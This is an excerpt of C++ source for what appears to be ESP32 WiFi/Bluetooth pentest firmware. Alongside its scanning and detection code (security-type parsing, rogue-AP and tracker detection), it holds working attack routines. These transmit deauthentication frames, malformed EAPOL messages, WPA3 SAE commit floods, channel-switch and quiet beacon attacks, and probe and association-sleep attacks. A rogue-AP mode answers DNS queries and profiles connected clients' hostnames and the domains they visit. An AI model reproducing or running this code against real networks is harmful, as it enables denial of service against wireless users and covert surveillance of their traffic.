    if (gps_obj.getGpsModuleStatus()) {
...
#endif
    else if ((scan_mode == BT_SCAN_FLIPPER) || (scan_mode == BT_SCAN_RAYBAN) ||
             (scan_mode == BT_SCAN_FLOCK) ||
             (scan_mode == BT_SCAN_FLOCK_WARDRIVE) ||
             (scan_mode == BT_SCAN_SIMPLE) || (scan_mode == BT_SCAN_AIRTAG) ||
...
#ifdef HAS_FULL_SCREEN
    display_obj.tft.fillRect(0, 16, TFT_WIDTH, 16, color);
    display_obj.tft.drawCentreString("Bluetooth Analyzer", TFT_WIDTH / 2, 16,
                                     2);
#ifdef HAS_ILI9341
    display_obj.touchToExit();
#endif
  ...
  pBLEScan->setMaxResults(0);
  if ((scan_mode == BT_SCAN_RAYBAN) || (scan_mode == WIFI_SCAN_WAR_DRIVE) ||
      (scan_mode == BT_SCAN_ANALYZER) || (scan_mode == BT_SCAN_FLOCK) ||
      (scan_mode == BT_SCAN_SIMPLE) || (scan_mode == BT_SCAN_SIMPLE_TWO) ||
      (scan_mode == BT_SCAN_FLOCK_WARDRIVE))
    pBLEScan->setDuplicateFilter(false);
  if ((scan_mode != WIFI_SCAN_WAR_DRIVE) &&
      (scan_mode != WIFI_SCAN_DETECT_FOLLOW)) {
...
int WiFiScan::checkMatchAP(char addr[], bool update_ap) {
  for (int i = 0; i < access_points->size(); i++) {
    ...
    for (int x = 0; x < 6; x++) {
      if ((uint8_t)strtol(&addr[x * 3], NULL, 16) !=
...
// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    ...
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0)) {
      ...
      uint8_t security_type =
          wifi_scan_obj.getSecurityType(snifferPacket->payload, len);
  ...
  // if ((snifferPacket->payload[0] != 0x80) && (wifi_scan_obj.currentScanMode
  // == WIFI_SCAN_AP_STA)) {
  if ((type == WIFI_PKT_DATA) &&
    ...
    for (int i = 0; i < stations->size(); i++) {
      ...
      for (int x = 0; x < 6; x++) {
        if (snifferPacket->payload[x + frame_offset] !=
            stations->get(i).mac[x]) {
          mac_match = false;
          break;
        }
      }
    ...
    if (mem_check) {
      Station sta = {{snifferPacket->payload[frame_offset],
...
uint8_t WiFiScan::getSecurityType(const uint8_t *beacon, uint16_t len) {
  ...
  const uint8_t *ies =
      beacon + 36; // Tagged parameters start after fixed 802.11 header
  ...
  while (i + 2 <= ies_len) {
    ...
    if (i + 2 + tag_len > ies_len)
      break; // Malformed IE, stop parsing
    ...
    if (tag_id == 48) {
      ...
      // version(2) + group cipher(4) + pairwise count(2) + 1 suite(4) + AKM
      // count(2) = 14
      if (tag_len < 14) {
        i += 2 + tag_len;
        continue;
      ...
      uint16_t pw_count =
          tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
      offset += 2 + pw_count * 4;
      ...
      for (uint16_t a = 0; a < akm_count; a++) {
        ...
        bool isIEEE =
            (tag_data[offset] == 0x00 && tag_data[offset + 1] == 0x0f &&
             tag_data[offset + 2] == 0xac);

        uint8_t akmType = tag_data[offset + 3];

        if (isIEEE) {
          if (akmType == 1 || akmType == 3 || akmType == 12 || akmType == 13)
            isEnterprise = true; // 802.1X authentication (WPA2-Enterprise) | FT
                                 // over 802.1X | FILS-SHA256 (WPA3-Enterprise)
                                 // | FILS-SHA384 (WPA3-Enterprise)
          if (akmType == 8)
            isWPA3 = true; // SAE (Simultaneous Authentication of Equals) —
                           // WPA3-Personal
        }
    ...
    // ── WPA IE (Tag 221, OUI 00:50:F2:01) — indicates WPA1 ───────
    else if (tag_id == 221 && tag_len >= 8 && tag_data[0] == 0x00 &&
             tag_data[1] == 0x50 && tag_data[2] == 0xf2 &&
             tag_data[3] == 0x01) {
      hasWPA = true;
      ...
      // WPA IE layout: OUI(3) + type(1) + version(2) + group cipher(4) = 10
      // bytes before pairwise count
      uint16_t offset = 10;
      uint16_t pw_count =
          tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
      offset += 2 + pw_count * 4;
      ...
      for (uint16_t a = 0; a < akm_count; a++) {
        ...
        bool isMSOUI =
            (tag_data[offset] == 0x00 && tag_data[offset + 1] == 0x50 &&
             tag_data[offset + 2] == 0xf2);

        if (isMSOUI && tag_data[offset + 3] == 0x01)
          isEnterprise = true; // AKM type 1 = 802.1X
  ...
  if (isWAPI)
    return WIFI_SECURITY_WAPI;
  if (isWPA3 && isEnterprise)
    return WIFI_SECURITY_WPA3_ENTERPRISE;
  if (isWPA3)
    return WIFI_SECURITY_WPA3;
  if (hasRSN && isEnterprise)
    return WIFI_SECURITY_WPA2_ENTERPRISE;
  if (hasRSN && hasWPA)
    return WIFI_SECURITY_WPA_WPA2_MIXED;
  if (hasRSN)
    return WIFI_SECURITY_WPA2;
  if (hasWPA)
    return isEnterprise ? WIFI_SECURITY_WPA2_ENTERPRISE : WIFI_SECURITY_WPA;
...
const WiFiScan::SuspiciousVendor WiFiScan::suspicious_vendors[] = {
    ...
    {"MediaTek Inc",
     SUSPICIOUS_ALWAYS,
     {0x000A00, 0x000C43, 0x000CE7, 0x0017A5},
     4},
...
const int WiFiScan::NUM_SUSPICIOUS_VENDORS =
    sizeof(WiFiScan::suspicious_vendors) /
    sizeof(WiFiScan::suspicious_vendors[0]);

// This fixes picking up a AP on an adjacent channel.
int WiFiScan::extractPineScanChannel(const uint8_t *payload, int len) {
  if (len < 38)
    return -1; // Ensure we have enough data

  // Jump to the element fields after the fixed beacon header and SSID field
  int pos =
      36 + payload[37] +
      2; // 36 fixed header bytes + SSID length + 2 bytes for SSID tag info

  // Search through the tags for the channel information (DS Parameter Set, tag
  // number 3)
  while (pos < len - 2) {
...
void WiFiScan::pineScanSnifferCallback(void *buf,
                                       wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
  ...
  if (type == WIFI_PKT_MGMT) {
    ...
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0)) {
      ...
      int ap_channel =
          WiFiScan::extractPineScanChannel(snifferPacket->payload, len);
      if (ap_channel == -1) {
        ap_channel = snifferPacket->rx_ctrl.channel;
      }

      // Extract capability flags
      uint16_t capab_info = ((uint16_t)snifferPacket->payload[34] |
                             ((uint16_t)snifferPacket->payload[35] << 8));
      bool suspicious_capability = (capab_info == 0x0001);
      bool tag_count =
          countPineScanTaggedParameters(snifferPacket->payload, len);
      ...
      uint8_t oui[3] = {snifferPacket->payload[10], snifferPacket->payload[11],
                        snifferPacket->payload[12]};
      uint32_t oui_value =
          ((uint32_t)oui[0] << 16) | ((uint32_t)oui[1] << 8) | oui[2];
      ...
      for (int i = 0; i < WiFiScan::NUM_SUSPICIOUS_VENDORS; i++) {
        const WiFiScan::SuspiciousVendor &vendor =
            WiFiScan::suspicious_vendors[i];
        ...
        for (int j = 0; j < vendor.oui_count; j++) {
          if (oui_value == vendor.ouis[j]) {
            if ((vendor.security_flags & SUSPICIOUS_ALWAYS) ||
                ...
                (is_protected &&
                 (vendor.security_flags & SUSPICIOUS_WHEN_PROTECTED))) {
              suspicious_oui = true;
              pinescan_match = true;
      ...
      if (already_confirmed) {
        ...
        ConfirmedPineScan confirmed =
            wifi_scan_obj.confirmed_pinescan->get(confirmed_index);
      ...
      if (!already_tracked) {
        ...
        PineScanTracker tracker =
            wifi_scan_obj.pinescan_trackers->get(ap_index);
      ...
      if (pinescan_match) {
        ...
        for (int i = 0; i < wifi_scan_obj.confirmed_pinescan->size(); i++) {
          ...
          for (int x = 0; x < 6; x++) {
            if (mac_addr[x] !=
                wifi_scan_obj.confirmed_pinescan->get(i).mac[x]) {
              mac_match = false;
              break;
            }
          }
        ...
        if (displayed_count < MAX_DISPLAY_ENTRIES) {
          ...
          ConfirmedPineScan to_display =
              wifi_scan_obj.confirmed_pinescan->get(idx);
...
void WiFiScan::multiSSIDSnifferCallback(void *buf,
                                        wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
    ...
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0)) {
      ...
      if (already_confirmed) {
        ...
        ConfirmedMultiSSID confirmed =
            wifi_scan_obj.confirmed_multissid->get(confirmed_index);
        if (snifferPacket->rx_ctrl.rssi > confirmed.rssi) {
          confirmed.rssi = snifferPacket->rx_ctrl.rssi;
        }
        if (essid != "" && essid != "[hidden]") {
      ...
      if (ap_index == -1) {
        if (wifi_scan_obj.confirmed_multissid->size() >=
            MAX_MULTISSID_ENTRIES) {
          if (!wifi_scan_obj.multissid_list_full_reported) {
            Serial.println(
                F("Confirmed MultiSSID List Full - Cannot add more"));
        ...
        MultiSSIDTracker tracker =
            wifi_scan_obj.multissid_trackers->get(ap_index);

        // Check if we have already seen this SSID hash
        bool hash_found = false;
        for (int i = 0;
             i < min(MULTISSID_THRESHOLD, (int)tracker.unique_ssid_count);
             i++) {
        ...
        if (!hash_found && tracker.unique_ssid_count < MULTISSID_THRESHOLD) {
          ...
          tracker.unique_ssid_count =
              min(MULTISSID_THRESHOLD, tracker.unique_ssid_count + 1);
      ...
      if (multi_ssid_ap) {
        ...
        new_confirmed.channel = ap_channel;
        new_confirmed.rssi = snifferPacket->rx_ctrl.rssi;
        new_confirmed.ssid_count =
            wifi_scan_obj.multissid_trackers->get(ap_index).unique_ssid_count;
        new_confirmed.displayed = false;
        ...
        String log_line =
            ...
            " RSSI: " + String(snifferPacket->rx_ctrl.rssi) +
            " SSIDs: " + String(new_confirmed.ssid_count) + " SSID: " + essid;
        log_line += "\n";
        delay(random(0, 10));
        Serial.print(log_line);
...
void WiFiScan::saeAttackLoop(uint32_t currentTime) {
  for (int i = 0; i < access_points->size(); i++) { // Find selected APs
    if (access_points->get(i).selected) {
      if (this->set_channel !=
          access_points->get(i).channel) // Set channel to AP's channel
...
bool WiFiScan::sae_group_sizes(uint16_t group, size_t &scalar_len,
                               size_t &element_len) {
  switch (group) {
  case 19:
    scalar_len = 32;
...
int WiFiScan::mbedtls_entropy_source(void *data, unsigned char *output,
                                     size_t len) {
  (void)data;
...
bool WiFiScan::sendSAECommitFrame(uint8_t *targ_addr, uint8_t *src_addr) {
  ...
  if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random,
                              &ctr_drbg) != 0)
    return false;

  // Repeat only if invalid
  while (mbedtls_mpi_cmp_int(&prec_int, 1) <= 0 ||
         mbedtls_mpi_cmp_mpi(&prec_int, &ecp_group.N) >= 0) {
    if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random,
                                &ctr_drbg) != 0)
      return false;
  }

  if (mbedtls_mpi_write_binary(&prec_int, current_index, scalar_len) != 0)
    return false;

  if (mbedtls_ecp_mul(&ecp_group, &ecp_point, &prec_int, &ecp_group.G,
                      mbedtls_ctr_drbg_random, &ctr_drbg) != 0)
    return false;

  write_bin_result = mbedtls_ecp_point_write_binary(
      &ecp_group, &ecp_point, MBEDTLS_ECP_PF_UNCOMPRESSED, &bin_len,
      ecp_point_bin, sizeof(ecp_point_bin));

  if ((write_bin_result != 0) || (bin_len != 65))
    return false;
  ...
  if (esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) !=
      ESP_OK)
    return false;
...
*/
bool WiFiScan::getSAEACT(const uint8_t *frame, size_t frame_len,
                         uint16_t &group_out, size_t &act_len_out) {
  extern WiFiScan wifi_scan_obj;
  ...
  if ((frame_len > frame_header_len) && (frame[0] == 0xB0) &&
      (frame[24] == 0x03) && (frame[26] == 0x01)) {
    is_sae = true;
...
void WiFiScan::passiveDiscoveryCallback(void *buf,
                                        wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
  if (type != WIFI_PKT_MGMT)
    return;
  ...
  if (payload[0] == 0x40) {
    char addr[18];
    sprintf(addr, "%02X:%02X:%02X:%02X:%02X:%02X", payload[10], payload[11],
            payload[12], payload[13], payload[14], payload[15]);
    String macStr = String(addr);
    ...
    // Format: [WIFI - Mobil Cihaz]   | MAC: YY:YY:YY:YY:YY:YY | Aranan: [SSID]
    char output[160];
    snprintf(output, sizeof(output), "[WIFI - %-13s] | MAC: %s | Aranan: %s",
             "Mobil Cihaz", macStr.c_str(), ssid.c_str());
    Serial.println(output);
  }
}
...
void WiFiScan::beaconSnifferCallback(void *buf,
  ...
  uint8_t src_addr[] = {snifferPacket->payload[10], snifferPacket->payload[11],
                        snifferPacket->payload[12], snifferPacket->payload[13],
                        snifferPacket->payload[14], snifferPacket->payload[15]};

  uint8_t dst_addr[] = {snifferPacket->payload[4], snifferPacket->payload[5],
                        snifferPacket->payload[6], snifferPacket->payload[7],
                        snifferPacket->payload[8], snifferPacket->payload[9]};
...
// with spaces.
    ...
    if (type == WIFI_PKT_MGMT) {
      ...
      else if (((snifferPacket->payload[30] == 0x88 &&
    ...
    if ((targ_ap.rssi + 1 < snifferPacket->rx_ctrl.rssi) ||
        (snifferPacket->rx_ctrl.rssi + 1 < targ_ap.rssi)) {
      targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
      access_points->set(targ_index, targ_ap);

      Serial.println((String)access_points->get(targ_index).essid +
                     " RSSI: " + (String)access_points->get(targ_index).rssi);
    } else
      return;
    ...
    if (type == WIFI_PKT_MGMT) {
      ...
      if (snifferPacket->payload[0] == 0x40) {
        ...
        for (int i = 0;
             i < sizeof(flock_ssid) / sizeof(wifi_scan_obj.flock_ssid[0]);
             i++) {
          if (strcasestr(probe_req_essid.c_str(),
                         wifi_scan_obj.flock_ssid[i])) {
    ...
    int frame_check =
        wifi_scan_obj.update_mac_entry(src_addr, snifferPacket->rx_ctrl.rssi);

    if (frame_check >= mac_history_len_half) {
      int32_t dloc = 0;
      bool is_following = is_following_candidate_light(
          wifi_scan_obj.mac_entries[frame_check - mac_history_len_half],
          millis(), &dloc);
      if (is_following) {
        wifi_scan_obj.mac_entries[frame_check - mac_history_len_half].dloc =
            dloc;
        wifi_scan_obj.mac_entries[frame_check - mac_history_len_half]
    ...
    if (type == WIFI_PKT_MGMT) {
      ...
      if (wifi_scan_obj.getSAEACT(snifferPacket->payload, len, group,
                                  act_len)) {
        wifi_scan_obj.mgmt_frames++;
...
void WiFiScan::broadcastCustomBeacon(uint32_t current_time,
                                     AccessPoint custom_ssid, int scan_mode) {
  ...
  static const uint8_t post_csa[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96,
                                     0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                                     0x00, 0x25, 0x03, 0x01, 0x00, 0xff};

  static const uint8_t post_quiet[] = {
      0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03,
      0x01, 0x00, 0x07, 0x06, 0x55, 0x53, 0x20, 0x64, 0x0b, 0x14, 0x20,
      0x01, 0x00, 0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x32, 0x04, 0x0c,
      0x12, 0x18, 0x60, 0x28, 0x06, 0x01, 0x05, 0xff, 0xff, 0x00, 0x64};
...
// Determine channels based on attack
  ...
  int ssidLen = realLen;
  if ((scan_mode != WIFI_ATTACK_CSA) && (scan_mode != WIFI_ATTACK_QUIET))
...
void WiFiScan::sendProbeAttack(uint32_t currentTime) {
  ...
  for (int i = 0; i < access_points->size(); i++) {
    ...
    if (access_points->get(i).selected) {
      ...
      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet,
...
void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  ...
  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default,
...
void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6],
  ...
  if (sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE ||
      sec == WIFI_SECURITY_WAPI) {
    eapol_packet_bad_msg1[35] = 0x5f; // Length 95 Bytes
    eapol_packet_bad_msg1[38] =
        0xCB; // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
...
/*void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String
dst_mac_str, uint8_t sec) { WiFiScan::set_channel = channel;
  this->changeChannel(channel);
  delay(1);
  ...
  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
        &eapol_packet_bad_msg1[4], &eapol_packet_bad_msg1[5],
&eapol_packet_bad_msg1[6], &eapol_packet_bad_msg1[7], &eapol_packet_bad_msg1[8],
&eapol_packet_bad_msg1[9]);
  ...
  if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec ==
WIFI_SECURITY_WAPI) { eapol_packet_bad_msg1[35] = 0x5f;     // Length 95 Bytes
    eapol_packet_bad_msg1[38] = 0xCB;     // Key‑Info (LSB)
Install|Ack|Pairwise, ver=3 eapol_packet_bad_msg1[39] = 0x00;     // Key Length
MSB eapol_packet_bad_msg1[40] = 0x00;     // Key Length LSB   (must be 0 with
GCMP) frame_size = frame_size - 22;         // Adjust frame size for WPA3
  }
...
void WiFiScan::sendAssociationSleep(const char *ESSID, uint8_t bssid[6],
                                    int channel, uint8_t mac[6]) {
  WiFiScan::set_channel = channel;
  this->changeChannel(channel);
  delay(1);
      ...
      for (int x = 0; x < access_points->get(i).stations->size(); x++) {
        if (stations->get(access_points->get(i).stations->get(x)).selected) {
          ...
          this->sendEapolBagMsg1(
              access_points->get(i).bssid, access_points->get(i).channel,
      ...
      for (int x = 0; x < access_points->get(i).stations->size(); x++) {
        if (stations->get(access_points->get(i).stations->get(x)).selected) {
          this->sendAssociationSleep(
              access_points->get(i).essid.c_str(), access_points->get(i).bssid,
...
// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    ...
    if (wifi_scan_obj.analyzer_frames_recvd >= ANALYZER_NAME_REFRESH) {
      if (type == WIFI_PKT_MGMT) { // It's management
        ...
        if ((snifferPacket->payload[0] == 0x80) &&
          ...
          if (snifferPacket->payload[37] <=
              0) // There is no ESSID. Just add BSSID
            display_string.concat(addr);
...
#ifndef HAS_DUAL_BAND
    wifi_scan_obj.channel_activity[wifi_scan_obj.set_channel - 1] =
        wifi_scan_obj.channel_activity[wifi_scan_obj.set_channel - 1] + 1;
#else
    wifi_scan_obj.channel_activity[wifi_scan_obj.dual_band_channel_index] =
        wifi_scan_obj.channel_activity[wifi_scan_obj.dual_band_channel_index] +
        1;
#endif
    ...
    if (found) {
      ...
      // Serial.println((String)access_points->get(targ_index).essid + "
      // Packets: " + (String)access_points->get(targ_index).packets);
      return;
    }
    ...
    if (found) {
      ...
      // (String)stations->get(targ_index).packets);
      return;
    }
  }
}
...
void WiFiScan::eapolSnifferCallback(void *buf,
  ...
  if (wifi_scan_obj.send_deauth) {
    if (snifferPacket->payload[0] == 0x80) {
      ...
      // Send packet
      for (int i = 0; i < 5; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default,
  ...
  if (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)
    eapol_offset = 32;
  else if (snifferPacket->payload[32] == 0x88 &&
...
void WiFiScan::changeChannel(int chan) {
  ...
  if (this->currentScanMode == WIFI_SCAN_CHAN_ANALYZER)
    this->addAnalyzerValue(this->set_channel * -1, -72, this->_analyzer_values,
                           TFT_WIDTH);
#endif
}
  ...
  if (!filtered) {
    ...
    while ((!channel_match) && (ap_selected)) {
      ...
      if (this->dual_band_channel_index >= DUAL_BAND_CHANNELS)
        ...
        this->dual_band_channel_index++;
      this->set_channel =
          this->dual_band_channels[this->dual_band_channel_index];
      ...
      for (int i = 0; i < access_points->size(); i++) {
        if (access_points->get(i).selected) {
          ap_selected = true;
          if (access_points->get(i).channel == this->set_channel) {
            // Serial.println("Setting to channel " + (String)this->set_channel
            // + " for AP " + access_points->get(i).essid);
            channel_match = true;
            break;
          }
        }
...
void WiFiScan::addAnalyzerValue(int16_t value, int rssi_avg,
                                int16_t target_array[], int array_size) {
...
void WiFiScan::signalAnalyzerLoop(uint32_t tick) {
  ...
  if ((this->currentScanMode == BT_SCAN_ANALYZER) ||
    ...
    if (tick - this->initTime >= BANNER_TIME) {
      ...
      this->addAnalyzerValue(this->_analyzer_value * BASE_MULTIPLIER, -72,
                             this->_analyzer_values, TFT_WIDTH);
      this->_analyzer_value = 0;
...
#ifdef HAS_SCREEN
  // #ifdef HAS_FULL_SCREEN
  display_obj.tft.fillRect(0, SCREEN_HEIGHT - GRAPH_VERT_LIM - (CHAR_WIDTH * 2),
                           SCREEN_WIDTH, (CHAR_WIDTH * 2) - 1, TFT_BLACK);
// #else
// #endif
// Serial.println("Drawing channel line...");
  ...
  for (int i = 1; i < CHAN_PER_PAGE + 1; i++) {
    ...
    display_obj.tft.setTextSize(1);
#endif
    display_obj.tft.setCursor(x_coord, SCREEN_HEIGHT - GRAPH_VERT_LIM -
                                           (CHAR_WIDTH * 2));
    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
    display_obj.tft.print(
        (String)(i + (CHAN_PER_PAGE * (this->activity_page - 1))));
  }
#else
  for (int i = 1; i < CHAN_PER_PAGE + 1; i++) {
    int x_mult = (i * 2) - 1;
    ...
    display_obj.tft.setCursor(x_coord, SCREEN_HEIGHT - GRAPH_VERT_LIM -
                                           (CHAR_WIDTH * 2));
    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
    display_obj.tft.print((String)this->dual_band_channels[(
        i + (CHAN_PER_PAGE * (this->activity_page - 1)) - 1)]);
  }
#endif
#endif
}
...
void WiFiScan::channelActivityLoop(uint32_t tick) {
  ...
  if (tick - this->initTime >= BANNER_TIME * 50) {
    initTime = millis();
    Serial.println(F("--------------"));
    for (int i = (activity_page * CHAN_PER_PAGE) - CHAN_PER_PAGE;
         i < activity_page * CHAN_PER_PAGE; i++) {
#ifndef HAS_DUAL_BAND
      Serial.println((String)(i + 1) + ": " + (String)channel_activity[i]);
#else
      Serial.println((String)this->dual_band_channels[i] + ": " +
                     (String)channel_activity[i]);
#endif
...
/*void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
    ...
    if (tick - this->initTime >= BANNER_TIME) {
      this->initTime = millis();
      this->addAnalyzerValue(this->_analyzer_value * BASE_MULTIPLIER, -72,
this->_analyzer_values, TFT_WIDTH); this->_analyzer_value = 0; if
(this->analyzer_name_update) {
        this->displayAnalyzerString(this->analyzer_name_string);
        this->analyzer_name_update = false;
      }
    }
...
#ifdef HAS_SCREEN
  display_obj.tft.fillRect(0, TFT_HEIGHT - GRAPH_VERT_LIM - (CHAR_WIDTH * 4),
                           TFT_WIDTH, CHAR_WIDTH + 2, TFT_BLACK);
  // display_obj.tft.drawCentreString("Frames/" + (String)BANNER_TIME + "ms",
  // TFT_WIDTH / 2, TFT_HEIGHT - GRAPH_VERT_LIM - (CHAR_WIDTH * 2), 1);
...
void WiFiScan::renderRawStats() {
  ...
  if ((this->currentScanMode == WIFI_SCAN_EAPOL) ||
    ...
    display_obj.tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    display_obj.tft.println("Complete EAPOL: " +
                            (String)this->getCompleteEapol());
    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
  }
  display_obj.tft.println("     RSSI: " + (String)this->min_rssi + " - " +
                          (String)this->max_rssi);
  if (this->send_deauth) {
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  ...
  Serial.println("     RSSI: " + (String)this->min_rssi + " - " +
                 (String)this->max_rssi);
  if (this->send_deauth)
    Serial.println(F("\nDEAUTH TX: TRUE"));
  else
...
void WiFiScan::renderPacketRate() {
  ...
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      ...
      display_obj.tft.println(access_points->get(i).essid + ": " +
                              (String)access_points->get(i).packets);
#endif
  ...
  for (int i = 0; i < stations->size(); i++) {
    if (stations->get(i).selected) {
#ifdef HAS_SCREEN
      display_obj.tft.println(macToString(stations->get(i).mac) + ": " +
                              (String)stations->get(i).packets);
#endif
      Serial.println(macToString(stations->get(i).mac) + ": " +
                     (String)stations->get(i).packets);
    }
  }
}
...
bool WiFiScan::singleARP(IPAddress ip_addr) {
  ...
  struct netif *netif_interface = (struct netif *)netif;
#else
  struct netif *netif_interface = (struct netif *)esp_netif_get_netif_impl(
      esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"));
  // esp_netif_t* netif_interface =
  // esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"); struct netif*
  // netif_interface = (struct netif*)netif; struct netif* netif_interface =
  // esp_netif_get_netif_impl(*netif);
#endif

  ip4_addr_t lwip_ip;
  IP4_ADDR(&lwip_ip, ip_addr[0], ip_addr[1], ip_addr[2], ip_addr[3]);
...
void WiFiScan::fullARP() {
  ...
  if (this->current_scan_ip != IPAddress(0, 0, 0, 0)) {
    ip4_addr_t lwip_ip;
    IP4_ADDR(&lwip_ip, this->current_scan_ip[0], this->current_scan_ip[1],
             this->current_scan_ip[2], this->current_scan_ip[3]);
...
void WiFiScan::portScan(uint8_t scan_mode, uint16_t targ_port) {
  ...
  if (scan_mode == WIFI_PORT_SCAN_ALL) {
    if (this->current_scan_port < MAX_PORT) {
      ...
      if (this->checkHostPort(this->current_scan_ip, this->current_scan_port,
                              100)) {
        String output_line = this->current_scan_ip.toString() + ": " +
                             (String)this->current_scan_port;
        display_string.concat(output_line);
        uint8_t temp_len = display_string.length();
        for (uint8_t i = 0; i < 40 - temp_len; i++) {
          display_string.concat(" ");
    ...
    if (this->checkHostPort(this->current_scan_ip, targ_port, 100)) {
      String output_line =
          this->current_scan_ip.toString() + ": " + (String)targ_port;
      display_string.concat(output_line);
      uint8_t temp_len = display_string.length();
      for (uint8_t i = 0; i < 40 - temp_len; i++) {
        display_string.concat(" ");
...
void WiFiScan::updateTrackerUI() {
  ...
  display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 1) + CHAR_WIDTH +
                                   EXT_BUTTON_WIDTH + 1);
  ...
  display_obj.tft.fillRect(
      0, (STATUS_BAR_WIDTH * 2) + CHAR_WIDTH - 1 + EXT_BUTTON_WIDTH, TFT_WIDTH,
      TFT_HEIGHT - STATUS_BAR_WIDTH + 1, TFT_BLACK);
  display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 2) + CHAR_WIDTH +
                                   EXT_BUTTON_WIDTH);
  display_obj.tft.setTextSize(1);
#endif
  ...
  for (int i = 0; i < n; i++) {
...
#ifndef HAS_MINI_SCREEN
    display_obj.tft.println(
        (String)ui_list[i].rssi + " " + macToString(ui_list[i].mac) +
        " Tx: " + (String)ui_list[i].frame_count + " " +
        (String)((millis() - ui_list[i].last_seen_ms) / 1000) + "s " +
        (String)ui_list[i].dloc);
#else
    String mac_str = macToString(ui_list[i].mac);
    display_obj.tft.println(
        mac_str.substring(mac_str.length() / 2) +
        " Tx: " + (String)ui_list[i].frame_count + " " +
        (String)((millis() - ui_list[i].last_seen_ms) / 1000) + "s ");
#endif
#endif
    ...
    Serial.println(" Frames: " + (String)ui_list[i].frame_count +
                   " Last Seen: " +
                   (String)((millis() - ui_list[i].last_seen_ms) / 1000) + "s");
  }
}
...
void WiFiScan::main(uint32_t currentTime) {
  ...
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  ...
  } else if (currentScanMode == WIFI_SCAN_PASSIVE_DISCOVERY) {
    if (currentTime - initTime >= this->channel_hop_delay * HOP_DELAY) {
      initTime = millis();
      this->channelHop();
    }
  } else if (currentScanMode == WIFI_SCAN_DYNAMIC_PORTAL) {
    ...
    if (this->wifi_initialized && (WiFi.softAPIP() != IPAddress(0, 0, 0, 0))) {
      ...
      if (packetSize) {
        byte buf[512];
        int len = hunterDnsUdp.read(buf, 512);
        IPAddress remoteIp = hunterDnsUdp.remoteIP();
        byte resp[512];
        int rpos = 0;
        resp[rpos++] = buf[0];
        resp[rpos++] = buf[1];
        ...
        resp[rpos++] = 0x00;
        int pos = 12;
        while (pos < len && buf[pos] != 0 && buf[pos] < 64)
          pos += buf[pos] + 1;
        pos++;
        for (int i = 12; i < pos + 4; i++)
          if (i < len)
            resp[rpos++] = buf[i];
        resp[rpos++] = 0xC0;
        resp[rpos++] = 0x0C;
  ...
  } else if (currentScanMode == WIFI_SCAN_SILENT_HUNTER) {
    if (this->wifi_initialized && (WiFi.softAPIP() != IPAddress(0, 0, 0, 0))) {
      yield();
      // 1. NetBIOS Hostname tespiti (Port 137)
      int nbSize = hunterNbUdp.parsePacket();
      if (nbSize > 32) {
        byte nbBuf[128];
        int nblen = hunterNbUdp.read(nbBuf, 128);
        IPAddress nbIp = hunterNbUdp.remoteIP();
        if (nbBuf[12] == 0x20) {
          String nbName = "";
          for (int i = 13; i < 44 && i + 1 < nblen; i += 2) {
            uint8_t c = ((nbBuf[i] - 0x41) << 4) | (nbBuf[i + 1] - 0x41);
            if (c > 31 && c < 127)
              nbName += (char)c;
            else
              break;
          ...
          if (nbName.length() > 0) {
            for (int i = 0; i < 8; i++) {
              if (hunter_profiles[i].ip == nbIp.toString()) {
                hunter_profiles[i].hostname = nbName;
                break;
              }
            }
          }
      ...
      // 2. DNS Analizi ve Uygulama Takibi
      int packetSize = hunterDnsUdp.parsePacket();
      if (packetSize) {
        byte buf[512];
        int len = hunterDnsUdp.read(buf, 512);
        ...
        while (pos < len && buf[pos] != 0 && buf[pos] < 64) {
          int l = buf[pos++];
          for (int i = 0; i < l && pos < len; i++)
            domain += (char)buf[pos++];
          if (pos < len && buf[pos] != 0)
            domain += ".";
        }

        if (domain.length() > 0 && !domain.startsWith("192.168.")) {
          int p_idx = -1;
          for (int i = 0; i < 8; i++) {
            if (hunter_profiles[i].ip == remoteIp.toString()) {
              p_idx = i;
              break;
            }
            if (hunter_profiles[i].ip == "" &&
